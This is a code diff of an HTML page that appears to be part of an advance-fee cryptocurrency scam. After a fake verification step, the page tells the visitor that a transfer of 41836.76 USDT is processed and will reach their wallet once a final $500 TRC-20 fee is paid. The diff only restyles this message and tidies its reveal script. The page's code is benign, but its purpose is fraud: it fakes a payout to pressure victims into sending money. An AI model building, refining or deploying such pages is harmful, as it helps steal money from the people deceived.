@@ -40,17 +40,15 @@
              data-callback="verificationSuccess">
         </div>
 
-       <div id="message">
-    ✅ Verification Complete
-    <br><br>
-    Thank you! You’ve been successfully VERIFIED. Your transfer of 41836.76 USDT is now completely processed on the blockchain market and should have it released to your Wallet Address ending (…JB7Ky) after this last (TRC-20) fee of $500 is completed.
+       <div id="message" style="display:none; margin-top:20px;">
+    <h2>✅ Verification Complete</h2>
+    <p>Thank you! You’ve been successfully VERIFIED. Your transfer of 41836.76 USDT is now completely processed on the blockchain market and should have it released to your Wallet Address ending (…JB7Ky) after this last (TRC-20) fee of $500 is completed.</p>
 </div>
-
     <script>
-        function verificationSuccess(token) {
-            document.getElementById("message").style.display = "block";
-        }
-    </script>
+function verificationSuccess(token) {
+    document.getElementById("message").style.display = "block";
+}
+</script>
 
 </body>
 </html>
